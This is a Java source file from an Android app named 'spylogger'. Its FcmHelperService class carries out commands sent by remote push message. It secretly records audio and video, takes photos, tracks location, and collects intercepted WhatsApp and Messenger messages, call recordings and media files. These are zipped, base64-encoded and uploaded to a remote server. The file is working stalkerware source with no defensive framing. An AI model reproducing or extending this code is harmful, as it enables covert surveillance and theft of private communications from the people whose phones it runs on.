package com.gravatasufoca.spylogger.services;

import android.content.Context;
import android.os.Environment;
import android.util.Log;

import com.gravatasufoca.spylogger.dao.DatabaseHelper;
import com.gravatasufoca.spylogger.helpers.ServicosHelper;
import com.gravatasufoca.spylogger.helpers.TaskComplete;
import com.gravatasufoca.spylogger.model.Configuracao;
import com.gravatasufoca.spylogger.model.Mensagem;
import com.gravatasufoca.spylogger.model.TipoMidia;
import com.gravatasufoca.spylogger.repositorio.RepositorioConfiguracao;
import com.gravatasufoca.spylogger.repositorio.RepositorioGravacao;
import com.gravatasufoca.spylogger.repositorio.RepositorioMensagem;
import com.gravatasufoca.spylogger.repositorio.RepositorioTopico;
import com.gravatasufoca.spylogger.repositorio.impl.RepositorioConfiguracaoImpl;
import com.gravatasufoca.spylogger.repositorio.impl.RepositorioGravacaoImpl;
import com.gravatasufoca.spylogger.repositorio.impl.RepositorioMensagemImpl;
import com.gravatasufoca.spylogger.repositorio.impl.RepositorioTopicoImpl;
import com.gravatasufoca.spylogger.utils.Utils;
import com.gravatasufoca.spylogger.utils.ZipAnexos;
import com.gravatasufoca.spylogger.vos.ConfiguracaoVO;
import com.gravatasufoca.spylogger.vos.EnvioArquivoVO;
import com.gravatasufoca.spylogger.vos.FcmMessageVO;
import com.gravatasufoca.spylogger.vos.LocalizacaoVO;
import com.j256.ormlite.dao.Dao;
import com.j256.ormlite.dao.GenericRawResults;
import com.j256.ormlite.field.DataType;

import java.io.File;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.Date;
import java.util.Iterator;
import java.util.List;

/**
 * Created by bruno on 05/01/17.
 */

public class FcmHelperService {
    private static final int MAX_MENSAGENS = 10;
    private Context context;
    private FcmMessageVO fcmMessageVO;
    private SendArquivoService sendArquivoService;
    private EnvioArquivoVO envioArquivoVO;
    private ServicosHelper servicosHelper;

    public FcmHelperService(Context context, FcmMessageVO fcmMessageVO) {
        this.context = context;
        this.fcmMessageVO = fcmMessageVO;
        sendArquivoService=new SendArquivoService(null);
        envioArquivoVO= new EnvioArquivoVO.EnvioArquivoVOBuilder()
                .setPhpId(fcmMessageVO.getPhpId())
                .setTipoAcao(fcmMessageVO.getTipoAcao())
                .setId(fcmMessageVO.getId())
                .build();

        servicosHelper=new ServicosHelper();
    }

    public void executar() {
        TaskComplete callback = new TaskComplete() {
            @Override
            public void onFinish(Object object) {
                if (object != null) {
                    enviarArquivo((String) object);
                }
            }
        };

        switch (fcmMessageVO.getTipoAcao()) {
            case RECUPERAR_ARQUIVO:
                enviarArquivo(recuperarArquivo());
                break;
            case ESTA_ATIVO:
                sendArquivoService.enviarAtivo(envioArquivoVO);
                break;
            case OBTER_AUDIO:
                servicosHelper.getAudio(context,fcmMessageVO.getDuracao(),callback);
                break;
            case OBTER_VIDEO:
                servicosHelper.getVideo(context,fcmMessageVO.getDuracao(),fcmMessageVO.getCameraFrente(),callback);
                break;
            case OBTER_FOTO:
                servicosHelper.getPicture(context,fcmMessageVO.getCameraFrente(),callback);
                break;
            case OBTER_LOCALIZACAO:
                servicosHelper.getLocation(context,fcmMessageVO.getDuracao(), new TaskComplete() {
                    @Override
                    public void onFinish(Object object) {
                        if(object!=null){
                            LocalizacaoVO localizacaoVO= (LocalizacaoVO) object;
                            localizacaoVO.setEnvioArquivoVO(envioArquivoVO);
                            sendArquivoService.enviarLocalizacao(localizacaoVO);
                        }
                    }
                });
                break;
            case CONFIGURACAO:
                atualizarConfiguracao();
                break;
            case SOLICITAR_REENVIO:
                reenviarMensagens(false);
                break;
            case LIMPAR_REENVIAR:
                reenviarMensagens(true);
                break;
            case LIMPAR:
                limparMensagens();
                break;
            case REENVIAR_ARQUIVOS:
                reenviarArquivos();
                break;
            case REENVIAR_LIGACOES:
                reenviarLigacoes(false);
                break;
            case LIMPAR_REENVIAR_LIGACOES:
                reenviarLigacoes(true);
                break;
            default:
                return;
        }
    }

    private void limparMensagens() {
        RepositorioTopico repositorioTopico;
        RepositorioMensagem repositorioMensagem;
        try {
            repositorioTopico=new RepositorioTopicoImpl(context);
            repositorioMensagem=new RepositorioMensagemImpl(context);

            repositorioMensagem.limpar();
            repositorioTopico.limpar();

        } catch (SQLException e) {
            Log.e("spylogger",e.getMessage());
        }finally {
            repositorioMensagem=null;
            repositorioTopico=null;
        }
    }

    private void reativarMensagens(){
        RepositorioTopico repositorioTopico;
        RepositorioMensagem repositorioMensagem;
        try {
            repositorioTopico = new RepositorioTopicoImpl(context);
            repositorioMensagem = new RepositorioMensagemImpl(context);

            repositorioTopico.reativar();
            repositorioMensagem.reativar();
        } catch (SQLException e) {
            Log.e("SPYLOGGER",e.getMessage());
        }finally {
            repositorioMensagem=null;
            repositorioTopico=null;
        }
    }

    private void reenviarMensagens(boolean reativar) {
        if(reativar) {
           reativarMensagens();
        }

        SendMensagensService sendMensagensService=new SendMensagensService(context,null);
        sendMensagensService.enviarTopicos();

        SendGravacoesService sendGravacoesService=new SendGravacoesService(context,null);
        sendGravacoesService.enviarTopicos();

    }

    private void reenviarArquivos(){

        File outputDir = Environment.getExternalStorageDirectory();
        File dirArquivos=new File(outputDir+"/smartlogs");
        if(dirArquivos!=null && dirArquivos.exists() && dirArquivos.canWrite()){
            dirArquivos.delete();
            dirArquivos=new File(outputDir+"/smartlogs");
            if(dirArquivos!=null){
                if(!dirArquivos.mkdir()){
                    return;
                }
            }
        }

        DatabaseHelper dbHelper = new DatabaseHelper(context);
        Dao<Mensagem, Integer> daoMensagem;
        GenericRawResults<Object[]> raws;
        List<File> arquivos = new ArrayList<>();
        Iterator<Object[]> iterator;
        try {
            daoMensagem = dbHelper.getDao(Mensagem.class);

            raws = daoMensagem.queryRaw("select id,tipoMidia,tamanhoArquivo,dataRecebida from mensagem ", new DataType[]{
                    DataType.INTEGER,DataType.ENUM_STRING,DataType.LONG,DataType.DATE_LONG
            });
            iterator = raws.iterator();
            while (iterator.hasNext()) {
                Object[] resultRaw = iterator.next();
                try {
                    if(fcmMessageVO.getArquivos().contains((Integer) resultRaw[0])){
                        continue;
                    }

                    Mensagem mensagem = new Mensagem.MensagemBuilder()
                            .setId((Integer) resultRaw[0])
                            .setTipoMidia(resultRaw[1] == null ? TipoMidia.CONTATO : TipoMidia.valueOf((String) resultRaw[1]))
                            .setTamanhoArquivo((Long) resultRaw[2])
                            .setDataRecebida((Date) resultRaw[3])
                            .build();

                    File arquivo=Utils.getMediaFile(
                            mensagem.getTipoMidia(),
                            mensagem.getTamanhoArquivo(),
                            mensagem.getDataRecebida(), 1);
                    if(arquivo!=null){
                        File tmp=new File(dirArquivos,mensagem.getId()+"");
                        Utils.copyFile(arquivo,tmp);
                        arquivos.add(tmp);
                    }

                } catch (Exception e) {
                    Log.e("spylogger", e.getMessage());
                }
                if (iterator.hasNext()) {
                    if (arquivos.size() == MAX_MENSAGENS) {
                        ZipAnexos zip=new ZipAnexos(dirArquivos);
                        File zipado=zip.getFile();
                        if(zipado!=null){
                            envioArquivoVO.setId(null);
                            enviarArquivo(zipado);
                        }
                        arquivos.clear();
                    }
                } else {
                    ZipAnexos zip=new ZipAnexos(dirArquivos);
                    File zipado=zip.getFile();
                    if(zipado!=null){
                        envioArquivoVO.setId(null);
                        enviarArquivo(zipado);
                    }
                }
            }
        } catch (SQLException e) {
            Log.e("spylogger", e.getMessage());
        }
    }

    private void reenviarLigacoes(boolean reativar){
        RepositorioGravacao repositorioGravacao;
        try {
            repositorioGravacao = new RepositorioGravacaoImpl(context);
            if(reativar) {
                repositorioGravacao.reativar();
            }

            SendGravacoesService sendGravacoesService=new SendGravacoesService(context,null);
            sendGravacoesService.enviarTopicos();
        } catch (SQLException e) {
            Log.e("SPYLOGGER",e.getMessage());
        }
    }


    private void atualizarConfiguracao(){
        try {
            ConfiguracaoVO configuracaoVO=fcmMessageVO.getConfiguracao();
            RepositorioConfiguracao repositorioConfiguracao=new RepositorioConfiguracaoImpl(context);

            Configuracao configuracao=repositorioConfiguracao.getConfiguracao();
            if(configuracao!=null){
                configuracao.setFacebook(configuracaoVO.isMessenger());
                configuracao.setWhatsApp(configuracaoVO.isWhatsApp());
                configuracao.setIntervalo(configuracaoVO.getIntervalo());
                configuracao.setMedia(configuracaoVO.isMedia());
                configuracao.setMiniatura(configuracaoVO.isMiniatura());
                configuracao.setSmsBlacklist(configuracaoVO.getSmsBlacklist());
                configuracao.setChamadasBlacklist(configuracaoVO.getChamadasBlacklist());
                configuracao.setWifi(configuracaoVO.isWifi());

                repositorioConfiguracao.atualizar(configuracao);

                Utils.startAlarm(context,configuracao);
            }
        } catch (SQLException e) {
            e.printStackTrace();
        }
    }

    private File recuperarArquivo(){
        try {
            RepositorioMensagem repositorioMensagem = new RepositorioMensagemImpl(context);
            Mensagem mensagem = repositorioMensagem.obterPorId(fcmMessageVO.getId());

            if (mensagem != null) {
                return Utils.getMediaFile(
                        mensagem.getTipoMidia(),
                        mensagem.getTamanhoArquivo(),
                        mensagem.getDataRecebida(), 2);
            }

        } catch (SQLException e) {
            Log.e(this.getClass().getSimpleName(), e.getMessage());
        }
        return null;
    }

    private void enviarArquivo(File file) {
        if(file!=null){
            enviarArquivo(Utils.encodeBase64(file));
        }
    }
    private void enviarArquivo(String file) {
        if(file!=null){
            envioArquivoVO.setArquivo(file);
            sendArquivoService.enviar(envioArquivoVO);
        }
    }
}
